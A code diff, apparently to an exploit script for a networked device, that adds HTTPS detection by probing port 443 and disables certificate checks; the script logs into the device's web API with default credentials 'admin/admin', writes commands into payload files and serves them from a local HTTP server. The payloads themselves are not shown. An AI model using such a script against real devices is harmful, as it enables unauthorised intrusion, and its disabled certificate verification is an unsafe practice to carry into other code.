@@ -1,4 +1,4 @@
-import requests, json, re, time, os, sys, threading, base64, hashlib, random
+import requests, json, re, time, os, sys, threading, base64, hashlib, random, socket
 import http.server
 import socketserver
 
@@ -18,6 +18,7 @@ settings_password = "admin"
 add_lan_headers = False
 # D2U has 31 char limit
 short_payload = False
+request_prefix = "http"
 
 class httpd:
     def __init__(self, host='localhost', port=8000, directory='.'):
@@ -45,7 +46,7 @@ def session_login():
     try:
         session = requests.Session()
         login = {'username': settings_user, 'password': settings_password}
-        response = session.post(f'http://{settings_remote_ip}/web/v1/user/login', json = login)
+        response = session.post(f'{request_prefix}://{settings_remote_ip}/web/v1/user/login', json=login, verify=False)
         response.raise_for_status()
         auth_response = response.json()
         if( "Authorization" in auth_response["data"] ):
@@ -62,7 +63,7 @@ def session_post(bearer, url, jsondata):
         headers = {
             "Authorization": f"{bearer}"
         }
-        response = session.post(f'http://{settings_remote_ip}/{url}', headers=headers, json=jsondata)
+        response = session.post(f'{request_prefix}://{settings_remote_ip}/{url}', headers=headers, json=jsondata, verify=False)
         response.raise_for_status()
         json_response = response.json()
         if( json_response["code"] == 200 ):
@@ -82,7 +83,7 @@ def session_get(bearer, url, jsondata):
         headers = {
             "Authorization": f"{bearer}"
         }
-        response = session.get(f'http://{settings_remote_ip}/{url}', headers=headers, json=jsondata)
+        response = session.get(f'{request_prefix}://{settings_remote_ip}/{url}', headers=headers, json=jsondata, verify=False)
         response.raise_for_status()
         json_response = response.json()
         if( json_response["code"] == 200 ):
@@ -104,6 +105,14 @@ def payload_writer(file,cmd):
 
 session = session_login()
 payloadserver = httpd(host=settings_localip,port=settings_localport,directory='./payloads/')
+
+# Detect https
+if True:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(2)
+    if( s.connect_ex((settings_remote_ip, 443)) == 0):
+        print("Found port 443 open, using https")
+        request_prefix = "https"
 
 if(session[0]):
     session_token = session[1]
